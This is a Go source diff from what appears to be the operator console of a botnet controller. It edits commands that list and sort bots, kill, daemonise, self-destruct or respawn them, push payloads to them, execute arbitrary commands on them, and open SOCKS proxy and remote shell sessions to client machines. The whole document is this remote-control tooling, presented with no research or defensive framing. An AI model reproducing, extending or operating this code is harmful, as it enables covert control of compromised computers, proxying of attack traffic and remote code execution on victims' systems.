@@ -129,7 +129,7 @@ func opBot(args []string) (exit bool, hasout bool, out string) {
 bot ls [id | addr]
 bot pull (all | select)
 bot sync $bot_id
-bot [kill | reconn | pkill | dd | ddd | zero] $bot_id
+bot [kill | reconn | pkill | bg | ddd | zero] $bot_id
 bot update $bot_id $payload_path
 bot [rm|call] $bot_id $exec`
 		return
@@ -138,7 +138,7 @@ bot [rm|call] $bot_id $exec`
 
 	switch args[0] {
 	case "ls":
-		by := "id"
+		by := "rtt"
 		if len(args) >= 2 {
 			by = args[1]
 		}
@@ -147,7 +147,7 @@ bot [rm|call] $bot_id $exec`
 		if err != nil {
 			return
 		}
-		kit.WriteTagStr(p1, by)
+		/*kit.WriteTagStr(p1, by)
 
 		n, _ := kit.ReadVLen(p1)
 		out += fmt.Sprintf("total=%v\n", n)
@@ -158,6 +158,34 @@ bot [rm|call] $bot_id $exec`
 				break
 			}
 			out += id + "\n"
+		}
+		out += fmt.Sprintf("total=%v\n", n)*/
+
+		list := base.PeerList{}
+		n, err := list.ReadFrom(p1)
+		if err != nil {
+			return
+		}
+
+		var pl []*base.PeerInfo
+		switch by {
+		case "addr":
+			pl = list.GetListByAddr()
+
+		case "time":
+			pl = list.GetListByTime()
+
+		case "id":
+			pl = list.GetListByID()
+
+		case "rtt":
+			fallthrough
+		default:
+			pl = list.GetListByRTT()
+		}
+		out += fmt.Sprintf("total=%v\n", n)
+		for _, v := range pl {
+			out += v.String() + "\n"
 		}
 		out += fmt.Sprintf("total=%v\n", n)
 
@@ -193,7 +221,7 @@ bot [rm|call] $bot_id $exec`
 		}
 		Vln(3, "Pull Info:", n, info)
 
-	case "dd":
+	case "bg":
 		fallthrough
 	case "ddd":
 		fallthrough
@@ -209,7 +237,7 @@ bot [rm|call] $bot_id $exec`
 		opcode := map[string]string {
 			"reconn": base.B_reconn,
 			"kill": base.B_kill,
-			"dd":  base.B_dodaemon,
+			"bg":  base.B_dodaemon,
 			"ddd":  base.B_apoptosis,
 			"zero":  base.B_rebirth,
 		}
@@ -437,7 +465,7 @@ func handleClient(admin *base.Auth, p0 net.Conn, id string, argv []string) {
 	switch mode {
 	case "socks":
 		//Vln(2, "socksv5")
-		p1, err := admin.GetConn2Client(id, base.B_fast)
+		p1, err := admin.GetConn2Client(id, base.B_fast0)
 		if err != nil {
 			return
 		}
@@ -467,7 +495,7 @@ func handleClient(admin *base.Auth, p0 net.Conn, id string, argv []string) {
 		Vln(3, "[cls]shellk", p0.RemoteAddr())
 
 	case "sh2":
-		p1, err := admin.GetConn2Client(id, base.B_sh)
+		p1, err := admin.GetConn2Client(id, base.B_csh)
 		if err != nil {
 			return
 		}
